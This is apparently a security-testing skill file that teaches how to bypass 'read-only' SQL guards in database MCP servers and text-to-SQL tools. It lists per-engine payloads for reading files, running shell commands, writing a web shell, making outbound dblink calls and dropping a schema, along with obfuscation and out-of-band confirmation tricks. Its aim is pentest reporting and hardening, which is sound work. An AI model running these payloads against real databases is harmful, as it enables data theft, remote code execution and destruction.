---
name: mcp-sql-guard-bypass
description: Bypass "read-only"/safe-SQL guards in database MCP servers, text-to-SQL endpoints, and admin query consoles — well-formed SELECTs that read files, dial out, run shell, or escape the read-only transaction. Distinct from classic SQLi (here the app intends to run caller-supplied SELECTs; the flaw is a shape-based safety check).
---

# Read-only / Safe-SQL Guard Bypass (DB MCP tools & text-to-SQL)

A growing class of apps *intends* to let a caller run arbitrary `SELECT`s — database MCP servers (a `query` tool), text-to-SQL assistants, BI connectors, admin consoles — and gate them with a "read-only" check. When that check is **shape-based** (`startswith("SELECT")`, a write-keyword blocklist, or a read-only transaction the driver lets you escape), it is bypassable. This is the class behind the archived reference PostgreSQL MCP server (a `COMMIT; DROP SCHEMA …` walking out of `BEGIN TRANSACTION READ ONLY`) and the Supabase "lethal trifecta." It is **not** classic SQL injection (attacker-controlled fragment in a trusted query) — here the caller is *allowed* to send a full statement, and the bypass is a legitimate-looking `SELECT`.

## Attack Surface

- **MCP servers** exposing `query` / `execute_sql` / `check_query` tools that advertise "read-only".
- **Text-to-SQL / NL-to-SQL** endpoints that run the generated SQL.
- **BI / reporting / "SQL runner" consoles** that "only allow SELECT."
- Anywhere a guard claims read-only but runs the statement on a login that is *not* itself least-privilege.

## Techniques (well-formed reads that are not reads)

Reframe by engine — each is a single `SELECT`/statement a shape check passes:

**PostgreSQL**
- File read: `SELECT pg_read_file('/etc/passwd')`, `pg_read_binary_file(...)`, `lo_import('/etc/passwd')`
- File **write**: `SELECT lo_export(lo_import('/etc/passwd'),'/tmp/x')`, `COPY (SELECT 1) TO PROGRAM 'id'`
- Outbound / SSRF / exfil: `SELECT * FROM dblink('host=OOB_HOST','SELECT 1') AS t(x int)`
- Re-enter executor / flip session: `query_to_xml('SELECT 1',true,false,'')`, `set_config('default_transaction_read_only','off',false)`
- Transaction escape (stacked): `COMMIT; DROP SCHEMA public CASCADE;`

**MSSQL** — `EXEC xp_cmdshell 'whoami'`; `SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\win.ini', SINGLE_CLOB) x`; `OPENQUERY`/`OPENDATASOURCE` to a linked/attacker server; `sp_OACreate` (OLE)

**MySQL/MariaDB** — `SELECT LOAD_FILE('/etc/passwd')`; `SELECT a INTO OUTFILE '/var/www/shell.php' FROM t`; `sys_exec('id')` (UDF)

**SQLite** — `SELECT load_extension('evil.so')`; `ATTACH DATABASE '/path/x.db' AS y`

**Obfuscation to defeat name/keyword scans** — inline comments (`SELECT/**/pg_read_file(...)`), mixed case, whitespace before `(`, a write keyword hidden inside a string literal to probe brittle blocklists.

## Confirmation (prove it, don't guess)

Turn a suspected bypass into evidence a report can stand on:
- **Out-of-band**: `dblink`/`LOAD_FILE`/`xp_dirtree` to an interactsh/Burp Collaborator host; a DNS/HTTP hit confirms outbound execution.
- **File-read echo**: read a known file and observe its contents in the result set.
- **Time-based** (blind/no output channel): `pg_sleep(10)` / `SELECT SLEEP(10)` / `BENCHMARK(...)` — a measurable delay confirms execution.
- **Second-order** (the "lethal trifecta"): a write that lands data an attacker can later read (`INSERT INTO public_table SELECT secret FROM tokens`).

## False-positive avoidance (is it actually vulnerable?)

A hardened guard checks what a statement **calls**, not just its shape. Before reporting, verify the target is *not* doing all of:
- Parses the statement and **fails closed** on unparseable input (so `OPENROWSET` is refused, not passed).
- Rejects side-effecting functions by name on the AST **and** lexically (denylist of `pg_read_file`/`dblink`/`xp_cmdshell`/…).
- Rejects a second statement / comments / write-DDL nodes even inside a CTE.
- Runs on a **read-only, least-privilege DB login** (so even a missed function can't write).

If those hold, the payloads above will be refused — that's a *pass*, not a finding. A quick way to characterize a guard's coverage is the open-source [readonly-sql-guard](https://github.com/gulmezeren2-byte/readonly-sql-guard) 28-attack benchmark; a hardened target refuses all of them, a shape-only one lets most through.

## Impact

RCE (shell functions), arbitrary file read/write, SSRF/pivot to internal services, and full data exfiltration — from a tool the operator believed was read-only. Report with the confirmed payload, the confirmation channel, and the specific guard weakness (shape check vs. function-level enforcement).
